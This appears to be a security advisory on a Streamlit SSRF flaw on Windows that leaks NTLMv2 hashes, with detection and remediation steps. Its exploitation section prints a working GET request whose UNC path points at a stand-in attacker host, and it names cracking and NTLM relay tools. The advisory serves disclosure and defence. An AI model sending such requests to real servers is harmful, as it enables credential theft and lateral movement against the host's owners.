---
id: 2026-06-streamlit-ssrf-windows
title: "Streamlit CVE-2026-33682 — unauthenticated SSRF on Windows leaks NTLMv2 credentials (June 2026)"
date_disclosed: 2026-06-10
last_updated: 2026-06-12
severity: high
status: patched
ecosystems: [pypi, streamlit]
tools_affected: [Streamlit Open Source < 1.54.0 on Windows hosts]
tags: [ssrf, ntlm, credential-theft, windows, streamlit, unauthenticated, vibe-platform]
---

## TL;DR

**CVE-2026-33682** is an unauthenticated SSRF vulnerability in **Streamlit < 1.54.0 running on Windows** that can coerce the server into initiating an outbound SMB (port 445) authentication attempt, leaking the **NTLMv2 challenge-response hash** of the Windows user running Streamlit to any attacker on the network. NTLM hashes can be cracked offline or relayed in pass-the-hash / relay attacks to gain code execution. No authentication, no user interaction required. Fixed in **Streamlit 1.54.0**.

## What happened

Streamlit's static-file serving resolves filesystem paths using `os.path.realpath()` or `Path.resolve()` before validating the supplied path. On Windows, supplying a **UNC path** (e.g., `\\\\attacker-ip\\share`) as the path component of a request causes the Streamlit server to attempt SMB authentication to the attacker-controlled host. Windows' built-in NTLM authentication fires automatically, transmitting the **NTLMv2 hash** of the process's Windows user account.

### Exploitation

A single unauthenticated GET request:

```
GET /static/..\\..\\..\\..\\..\\\\attacker-ip\share\any.file HTTP/1.1
Host: streamlit-server:8501
```

…or an equivalent UNC path appended to the Streamlit URI path triggers the SMB authentication attempt to `attacker-ip:445`.

The attacker receives:
- **NTLMv2 challenge-response hash** — crackable offline with hashcat/john, or relayable via NTLM relay attacks (Responder, ntlmrelayx) to authenticate to other services on the network as the Streamlit process user.

### Vibe-coding context

Streamlit is one of the most popular quick-UI frameworks for vibe-coded data science and AI apps. Many deployments:
- Run on Windows developer workstations or Windows-based cloud VMs
- Run under a domain or machine account with access to internal network resources
- Are exposed to the local network or internet with **no authentication** (Streamlit's default)

An attacker on the same LAN — or any attacker who can send HTTP to a publicly-exposed Streamlit port — can capture credentials for the host account and pivot laterally.

## Am I affected?

```bash
# Check Streamlit version
pip show streamlit | grep Version
# Vulnerable if Version < 1.54.0

# Check if running on Windows
python -c "import sys; print(sys.platform)"
# Affected if: win32
```

You are affected if:
- `streamlit < 1.54.0`
- Running on **Windows** (Linux/macOS are NOT affected — Linux doesn't automatically attempt NTLM for UNC paths)
- The Streamlit server is reachable from any untrusted network (LAN, internet)

## If you are affected

1. **Upgrade immediately**: `pip install "streamlit>=1.54.0"`
2. **Check SMB egress logs** for outbound connections to unusual hosts on port 445 from the Streamlit process.
3. **Rotate the Windows account password** used to run Streamlit if you suspect the hash was captured.
4. **Add authentication** to your Streamlit deployment — never expose a development Streamlit server to an untrusted network without auth.
5. **Block outbound SMB (port 445)** from application servers at the firewall level.

## Prevention

- Always upgrade Streamlit promptly — the framework is widely used in vibe-coded AI apps and frequently carries high-severity CVEs.
- **Block outbound SMB at the network perimeter** — Windows servers should not be permitted to make outbound SMB connections to the internet.
- Use Streamlit's built-in auth (Streamlit Community Cloud) or add an auth proxy (nginx, Cloudflare Access) in front of any publicly-accessible deployment.
- Run Streamlit on Linux rather than Windows where possible — avoids the NTLM credential exposure class entirely.

## Sources

- [GitLab Advisory Database — CVE-2026-33682: Unauthenticated SSRF Vulnerability in Streamlit on Windows (NTLM Credential Exposure)](https://advisories.gitlab.com/pkg/pypi/streamlit/CVE-2026-33682/) — canonical advisory, path validation root cause.
- [NVD — CVE-2026-33682](https://nvd.nist.gov/vuln/detail/CVE-2026-33682) — official CVE record, affected version range.
- [CybersecurityNews — "New Streamlit Vulnerability Allows Hackers to Launch Cloud Account Takeover Attacks"](https://cybersecuritynews.com/streamlit-vulnerability/) — exploitation narrative, Windows NTLM context.
- [Snyk — streamlit vulnerabilities](https://security.snyk.io/package/pip/streamlit) — version-specific vulnerability tracking, remediation versions.
